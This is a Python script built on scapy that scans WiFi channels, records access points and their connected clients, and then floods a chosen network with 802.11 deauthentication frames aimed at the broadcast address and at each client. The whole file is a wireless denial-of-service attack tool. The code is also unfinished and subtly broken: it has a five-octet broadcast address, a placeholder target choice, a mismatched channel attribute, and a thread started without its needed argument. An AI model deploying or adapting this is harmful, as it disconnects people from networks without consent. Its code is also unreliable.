from scapy.all import *
from collections import defaultdict
from time import sleep
from threading import RLock, Thread
import os


class Interceptor:
    _BROADCAST_MACADDR = "ff:ff:ff:ff:ff"
    _CH_RANGE = range(1, 12)

    def __init__(self, *args, **kwargs):
        self.interface = "wlan0" # todo set as conf also
        self._channel_sniff_timeout = 5  # todo utils
        self._max_miss_counter = 3
        self._scan_intv = 0.1
        self._deauth_intv = 0.1

        self._abort = False
        self._current_channel_num = None
        self._current_channel_aps = set()

        self.target_ssid = str()
        self._active_aps = defaultdict(dict)
        # {
        #     ssid: {
        #         channel: n,
        #         mac_addr: x,
        #         clients: []
        #     }
        # }

    def _set_channel(self, ch_num: int):
        os.system("iw dev %s set channel %d" % (self.interface, ch_num))
        self._current_channel = ch_num

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Elt):
                ssid = pkt[Dot11Elt].info.decode()
                if ssid:
                    ap_mac = pkt.addr3
                    if ssid not in self._active_aps:
                        self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
                    c_mac = pkt.addr1
                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
                        # todo check type of pkt instead
                        self._active_aps[ssid]["clients"].append(c_mac)
                    self._current_channel_aps.add(ssid)
        except:
            pass

    def _scan_channels_for_aps(self):
        for ch in self._CH_RANGE:
            print(f"setting and scanning channel {ch}...")
            self._set_channel(ch)
            sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout)

    def _start_initial_ap_scan(self):
        while not self._abort:
            try:
                self._scan_channels_for_aps()

                to_remove = list()
                for ssid in self._active_aps.keys():
                    if ssid not in self._current_channel_aps:
                        self._active_aps[ssid]["miss_counter"] += 1
                    if self._active_aps[ssid]["miss_counter"] >= self._max_miss_counter:
                        to_remove.append(ssid)
                for ssid_to_remove in to_remove:
                    del self._active_aps[ssid_to_remove]
                self._current_channel_aps.clear()

                sleep(self._scan_intv)
            except KeyboardInterrupt as exc:
                break

        print("Choose target")
        return "x"

    def _clients_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Elt):
                ssid = pkt[Dot11Elt].info.decode()
                if ssid == self.target_ssid:
                    c_mac = pkt.addr1
                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
                        # todo check type of pkt instead
                        self._active_aps[ssid]["clients"].append(c_mac)
        except:
            pass

    def _listen_for_clients(self):
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)

    def _run_deauther(self, target_ssid: str):
        rd_frm = RadioTap()
        deauth_frm = Dot11Deauth()
        while not self._abort:
            ap_mac = self._active_aps[target_ssid]["mac_addr"]
            sendp(rd_frm /
                  Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                  deauth_frm,
                  iface=self.interface)  # todo broadcast works?
            for client_mac in self._active_aps[target_ssid]["clients"]:
                sendp(rd_frm /
                      Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                      deauth_frm,
                      iface=self.interface)
            sleep(self._deauth_intv)

    def run(self):
        self.target_ssid = self._start_initial_ap_scan()
        self._set_channel(self._active_aps[self.target_ssid]["channel"])

        for action in [self._run_deauther, self._listen_for_clients]:
            t = Thread(target=action, args=tuple(), daemon=True)
            t.start()

        while not self._abort:
            print("stats here")
            sleep(5)

    @staticmethod
    def _init_ap_dict(mac_addr: str, ch: int) -> dict:
        return {
            "channel": ch,
            "mac_addr": mac_addr,
            "clients": list(),
            "miss_counter": 0  # when this reaches self.max_miss_cnt, remove
        }

if __name__ == "__main__":
    i = Interceptor()
    i.run()
